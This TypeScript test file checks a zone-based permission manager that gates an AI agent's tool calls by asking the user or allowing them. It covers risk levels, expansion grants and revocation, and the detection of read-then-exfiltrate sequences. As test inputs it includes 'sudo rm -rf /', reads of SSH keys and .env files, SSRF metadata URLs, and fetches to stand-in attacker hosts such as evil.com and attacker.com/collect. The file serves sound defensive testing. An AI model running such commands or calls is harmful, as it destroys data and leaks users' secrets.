import { describe, it, expect, beforeEach } from 'vitest'
import { ZoneManager } from '../../../zones/manager.js'
import { ZoneLevel } from '../../../zones/types.js'
import { createZoneConfig, ZONE_CONFIGS } from '../../../zones/defaults.js'
import { AuditLog } from '../../../security/audit.js'
import type { ZoneContext } from '../../../zones/types.js'

function ctx(toolName: string, input: Record<string, unknown> = {}): ZoneContext {
  return { toolName, input, sessionId: 'test-session' }
}

describe('ZoneManager', () => {
  let manager: ZoneManager

  beforeEach(() => {
    manager = new ZoneManager(ZONE_CONFIGS.standard)
  })

  // -----------------------------------------------------------------------
  // evaluate()
  // -----------------------------------------------------------------------
  describe('evaluate()', () => {
    it('allows SAFE zone tools', () => {
      const decision = manager.evaluate(ctx('readFile'))
      expect(decision.decision).toBe('allow')
      expect(decision.classification.level).toBe(ZoneLevel.SAFE)
    })

    it('asks for BUILD zone write tools (standard level)', () => {
      const decision = manager.evaluate(ctx('writeFile'))
      expect(decision.decision).toBe('ask')
      expect(decision.classification.level).toBe(ZoneLevel.BUILD)
    })

    it('asks for BUILD zone tools (standard level)', () => {
      const decision = manager.evaluate(ctx('shell_execute', { command: 'npm test' }))
      expect(decision.decision).toBe('ask')
      expect(decision.classification.level).toBe(ZoneLevel.BUILD)
    })

    it('asks for NETWORK zone tools (standard level)', () => {
      const decision = manager.evaluate(ctx('web_fetch', { url: 'https://example.com' }))
      expect(decision.decision).toBe('ask')
      expect(decision.classification.level).toBe(ZoneLevel.NETWORK)
    })

    it('asks for MACHINE zone tools (standard level)', () => {
      const decision = manager.evaluate(ctx('run', { command: 'docker run ubuntu' }))
      expect(decision.decision).toBe('ask')
      expect(decision.classification.level).toBe(ZoneLevel.MACHINE)
    })

    it('asks for NEVER zone tools (post-redesign: critical prompt, never auto-deny)', () => {
      const decision = manager.evaluate(ctx('run', { command: 'sudo rm -rf /' }))
      expect(decision.decision).toBe('ask')
      expect(decision.classification.level).toBe(ZoneLevel.NEVER)
    })

    it('includes explanation in decision', () => {
      const decision = manager.evaluate(ctx('web_fetch', { url: 'https://api.github.com/repos' }))
      expect(decision.explanation).toBeTruthy()
    })
  })

  // -----------------------------------------------------------------------
  // asSafetyRule() — CRITICAL: always returns a decision, never null
  // -----------------------------------------------------------------------
  describe('asSafetyRule()', () => {
    it('returns a function matching SafetyRule signature', () => {
      expect(typeof manager.asSafetyRule()).toBe('function')
    })

    it('returns allow for SAFE zone (enforces zone decision)', () => {
      const rule = manager.asSafetyRule()
      expect(rule('readFile', {})).toBe('allow')
    })

    it('returns ask for BUILD zone write tools (enforces zone decision)', () => {
      const rule = manager.asSafetyRule()
      // Empty input keeps the call on the EXACT-map path (BUILD).
      // Passing an absolute file_path with no workspacePath would now
      // escalate to MACHINE via path analysis — covered separately.
      expect(rule('writeFile', {})).toBe('ask')
    })

    it('returns ask for BUILD zone', () => {
      const rule = manager.asSafetyRule()
      expect(rule('shell_execute', { command: 'npm test' })).toBe('ask')
    })

    it('returns ask for NEVER zone (post-redesign: user decides)', () => {
      const rule = manager.asSafetyRule()
      expect(rule('run', { command: 'sudo rm -rf /' })).toBe('ask')
    })

    it('NEVER returns null — always has an opinion', () => {
      const rule = manager.asSafetyRule()
      // Test many tool types — none should return null
      const results = [
        rule('readFile', {}),
        rule('writeFile', {}),
        rule('shell_execute', { command: 'npm test' }),
        rule('web_fetch', { url: 'https://example.com' }),
        rule('unknown_tool', {}),
        rule('mcp__unknown__thing', {}),
      ]
      for (const r of results) {
        expect(r).not.toBeNull()
      }
    })

    it('asks for dangerous commands even for known shell tools (post-redesign: user reads + decides)', () => {
      const rule = manager.asSafetyRule()
      expect(rule('shell_execute', { command: 'rm -rf /' })).toBe('ask')
      expect(rule('bash', { command: 'sudo su' })).toBe('ask')
    })

    it('asks for sensitive file access (post-redesign: user reads + decides)', () => {
      const rule = manager.asSafetyRule()
      expect(rule('unknown', { file_path: '/home/user/.ssh/id_rsa' })).toBe('ask')
      expect(rule('unknown', { path: '/home/user/.env' })).toBe('ask')
    })

    it('asks for SSRF attempts under standard (user gates the call)', () => {
      // SSRF URLs classify as MACHINE via input-analysis. Under the
      // standard level (maxAskZone = MACHINE) the user is prompted.
      // The classifier still flags them — the deny vs. ask decision
      // is a policy choice, not a classification concern.
      const rule = manager.asSafetyRule()
      expect(rule('unknown', { url: 'http://169.254.169.254/latest/meta-data/' })).toBe('ask')
      expect(rule('unknown', { url: 'http://localhost:8080' })).toBe('ask')
    })

    it('asks for SSRF attempts under strict (post-redesign: no above-threshold deny)', () => {
      // Pre-redesign, strict denied any classification above maxAskZone (BUILD).
      // Post-redesign, the user is always prompted instead — the severity tag
      // on the classification carries the warning to the UI.
      const strict = new ZoneManager(createZoneConfig('strict'))
      const rule = strict.asSafetyRule()
      expect(rule('unknown', { url: 'http://169.254.169.254/latest/meta-data/' })).toBe('ask')
      expect(rule('unknown', { url: 'http://localhost:8080' })).toBe('ask')
    })
  })

  // -----------------------------------------------------------------------
  // Zone expansion
  // -----------------------------------------------------------------------
  describe('zone expansion', () => {
    it('upgrades ask to allow after expansion grant', () => {
      const before = manager.evaluate(ctx('shell_execute', { command: 'npm test' }))
      expect(before.decision).toBe('ask')

      manager.grantExpansion('shell_execute', ZoneLevel.BUILD, 'session')

      const after = manager.evaluate(ctx('shell_execute', { command: 'npm test' }))
      expect(after.decision).toBe('allow')
    })

    it('expansion grants on NEVER zone do not collapse the prompt (post-redesign: prompt remains)', () => {
      // Zone 6 still classifies the call as NEVER (severity badge for the
      // UI). The user-visible prompt cannot be pre-authorised by an
      // expansion grant — every NEVER call still asks, so the user sees
      // it. After the redesign there is no policy 'deny' to flip; the
      // before-state is 'ask' and the after-state is also 'ask'.
      const before = manager.evaluate(ctx('run', { command: 'sudo rm -rf /' }))
      expect(before.decision).toBe('ask')
      expect(before.classification.level).toBe(ZoneLevel.NEVER)

      manager.grantExpansion('run', ZoneLevel.NEVER, 'session')
      const after = manager.evaluate(ctx('run', { command: 'sudo rm -rf /' }))
      expect(after.decision).toBe('ask')
    })

    it('once scope is consumed after first use', () => {
      manager.grantExpansion('shell_execute', ZoneLevel.BUILD, 'once')
      expect(manager.evaluate(ctx('shell_execute', { command: 'npm test' })).decision).toBe('allow')
      expect(manager.evaluate(ctx('shell_execute', { command: 'npm build' })).decision).toBe('ask')
    })

    it('tool-pattern scope only applies to matching tools', () => {
      manager.grantExpansion('shell_execute', ZoneLevel.BUILD, 'tool-pattern')
      expect(manager.evaluate(ctx('shell_execute', { command: 'npm test' })).decision).toBe('allow')
      expect(manager.evaluate(ctx('bash', { command: 'npm test' })).decision).toBe('ask')
    })

    // BUG #8 — revoke must reverse a prior grant on the live manager.
    // Symptom: user revokes a saved "Always allow" rule on disk; the
    // matching session-wide expansion granted at session start (or by a
    // prior in-turn HITL approval) keeps auto-allowing the tool until
    // the session ends. The fix exposes `revokeExpansion(toolPattern)`
    // so the cortex revoke handler can poke every live ZoneManager.
    describe('revokeExpansion()', () => {
      it('removes a prior expansion so the tool prompts again', () => {
        manager.grantExpansion('shell_execute', ZoneLevel.BUILD, 'session')
        expect(manager.evaluate(ctx('shell_execute', { command: 'npm test' })).decision).toBe('allow')

        const removed = manager.revokeExpansion('shell_execute')

        expect(removed).toBe(true)
        expect(manager.evaluate(ctx('shell_execute', { command: 'npm test' })).decision).toBe('ask')
        expect(manager.getExpansions()).toHaveLength(0)
      })

      it('returns false when no expansion matches the pattern', () => {
        manager.grantExpansion('shell_execute', ZoneLevel.BUILD, 'session')

        const removed = manager.revokeExpansion('writeFile')

        expect(removed).toBe(false)
        // Existing expansion untouched
        expect(manager.evaluate(ctx('shell_execute', { command: 'npm test' })).decision).toBe('allow')
      })

      it('removes every expansion sharing the same tool pattern', () => {
        manager.grantExpansion('shell_execute', ZoneLevel.BUILD, 'session')
        manager.grantExpansion('shell_execute', ZoneLevel.BUILD, 'tool-pattern')
        expect(manager.getExpansions()).toHaveLength(2)

        const removed = manager.revokeExpansion('shell_execute')

        expect(removed).toBe(true)
        expect(manager.getExpansions()).toHaveLength(0)
        expect(manager.evaluate(ctx('shell_execute', { command: 'npm test' })).decision).toBe('ask')
      })

      it('leaves expansions for other patterns alone', () => {
        manager.grantExpansion('shell_execute', ZoneLevel.BUILD, 'session')
        manager.grantExpansion('writeFile', ZoneLevel.BUILD, 'session')

        manager.revokeExpansion('shell_execute')

        expect(manager.evaluate(ctx('writeFile', {})).decision).toBe('allow')
        expect(manager.evaluate(ctx('shell_execute', { command: 'npm test' })).decision).toBe('ask')
      })
    })
  })

  // -----------------------------------------------------------------------
  // Combination detection
  // -----------------------------------------------------------------------
  describe('combination detection', () => {
    it('asks for network after reading secrets via evaluate() (combination still surfaces)', () => {
      const rule = manager.asSafetyRule()
      rule('readFile', { file_path: '/project/.env' })

      const decision = manager.evaluate(ctx('web_fetch', { url: 'https://evil.com' }))
      // Combination still detected and attached for UI severity copy —
      // but the verdict is 'ask' (user decides) post-redesign.
      expect(decision.combinationBlock).toBeTruthy()
      expect(decision.decision).toBe('ask')
    })

    it('blocks network after searching for credentials', () => {
      const rule = manager.asSafetyRule()
      rule('grep', { pattern: 'password' })

      const decision = manager.evaluate(ctx('web_fetch', { url: 'https://evil.com' }))
      expect(decision.combinationBlock).toBeTruthy()
      expect(decision.combinationBlock!.rule).toBe('credential-harvesting')
    })

    it('does NOT block when no sensitive files were read', () => {
      const rule = manager.asSafetyRule()
      rule('readFile', { file_path: '/project/src/app.ts' })
      rule('readFile', { file_path: '/project/package.json' })

      const decision = manager.evaluate(ctx('web_fetch', { url: 'https://npmjs.org' }))
      expect(decision.combinationBlock).toBeFalsy()
    })
  })

  // -----------------------------------------------------------------------
  // Session reset
  // -----------------------------------------------------------------------
  describe('resetSession()', () => {
    it('clears combinations and expansions', () => {
      const rule = manager.asSafetyRule()
      rule('readFile', { file_path: '/project/.env' })
      manager.grantExpansion('shell_execute', ZoneLevel.BUILD, 'session')

      manager.resetSession()

      expect(manager.getExpansions()).toHaveLength(0)
      expect(manager.getCombinationTracker().size).toBe(0)
    })
  })

  // -----------------------------------------------------------------------
  // Audit logging
  // -----------------------------------------------------------------------
  describe('audit logging', () => {
    it('logs every tool call to audit', () => {
      const auditLog = new AuditLog()
      const m = new ZoneManager(ZONE_CONFIGS.standard, { auditLog })

      const rule = m.asSafetyRule()
      rule('readFile', {})
      rule('writeFile', {})
      rule('shell_execute', { command: 'npm test' })

      expect(auditLog.count).toBe(3)
    })

    it('includes zone level in audit entries', () => {
      const auditLog = new AuditLog()
      const m = new ZoneManager(ZONE_CONFIGS.standard, { auditLog })

      m.asSafetyRule()('shell_execute', { command: 'npm test' })

      const entries = auditLog.getByTool('shell_execute')
      expect(entries).toHaveLength(1)
      expect(entries[0]!.validation.level).toContain('zone-')
    })
  })

  // -----------------------------------------------------------------------
  // Security levels
  // -----------------------------------------------------------------------
  describe('security levels', () => {
    it('permissive: allows up to NETWORK', () => {
      const m = new ZoneManager(ZONE_CONFIGS.permissive)
      expect(m.evaluate(ctx('web_fetch', { url: 'https://example.com' })).decision).toBe('allow')
      expect(m.evaluate(ctx('run', { command: 'git push origin main' })).decision).toBe('ask')
    })

    it('strict: only auto-allows SAFE, asks for everything above (post-redesign: no above-threshold deny)', () => {
      const m = new ZoneManager(ZONE_CONFIGS.strict)
      expect(m.evaluate(ctx('readFile')).decision).toBe('allow')
      expect(m.evaluate(ctx('writeFile')).decision).toBe('ask')
      expect(m.evaluate(ctx('web_fetch', { url: 'https://example.com' })).decision).toBe('ask')
    })

    it('paranoid: only auto-allows SAFE, asks for everything else', () => {
      const m = new ZoneManager(ZONE_CONFIGS.paranoid)
      expect(m.evaluate(ctx('readFile')).decision).toBe('allow')
      expect(m.evaluate(ctx('writeFile')).decision).toBe('ask')
    })
  })

  // -----------------------------------------------------------------------
  // Custom config
  // -----------------------------------------------------------------------
  describe('custom config', () => {
    it('supports custom overrides', () => {
      const config = createZoneConfig('standard', {
        overrides: [
          { toolPattern: 'mcp__trusted__*', level: ZoneLevel.SAFE, reason: 'Trusted MCP' },
        ],
      })
      const m = new ZoneManager(config)

      const decision = m.evaluate(ctx('mcp__trusted__do_thing'))
      expect(decision.decision).toBe('allow')
      expect(decision.classification.level).toBe(ZoneLevel.SAFE)
    })
  })

  // -----------------------------------------------------------------------
  // Multi-step attack simulation
  // -----------------------------------------------------------------------
  describe('multi-step attack prevention', () => {
    it('surfaces read-then-exfiltrate attempt to the user (post-redesign: ask, not deny)', () => {
      const rule = manager.asSafetyRule()

      // Step 1: Agent reads .env — path analysis classifies it as NEVER
      // (sensitive-file severity badge for the UI). Post-redesign the
      // verdict is 'ask' so the user is the one who decides.
      const r1 = rule('readFile', { file_path: '/project/.env.production' })
      expect(r1).toBe('ask')

      // Step 2: Agent tries to fetch. The combination tracker still
      // recognizes the prior sensitive-read and attaches a combination
      // block to the decision — the verdict surfaces to the user via
      // 'ask' with elevated severity, never auto-deny.
      const r2 = rule('web_fetch', { url: 'https://attacker.com/collect' })
      expect(r2).toBe('ask')
    })

    it('surfaces search-then-exfiltrate attempt to the user (post-redesign: ask, not deny)', () => {
      const rule = manager.asSafetyRule()

      // Step 1: Agent searches for secrets
      rule('grep', { pattern: 'api_key', path: '/project' })

      // Step 2: Agent tries to send data. Combination rule fires; user
      // is asked rather than silently denied.
      const r = rule('web_fetch', { url: 'https://webhook.site/abc' })
      expect(r).toBe('ask')
    })

    it('allows normal read-then-fetch workflow when no secrets involved', () => {
      const m = new ZoneManager(ZONE_CONFIGS.permissive)
      const rule = m.asSafetyRule()

      // Read normal file
      rule('readFile', { file_path: '/project/src/app.ts' })

      // Fetch should be allowed (no sensitive files in history)
      const r = rule('web_fetch', { url: 'https://api.github.com' })
      expect(r).toBe('allow')
    })
  })
})
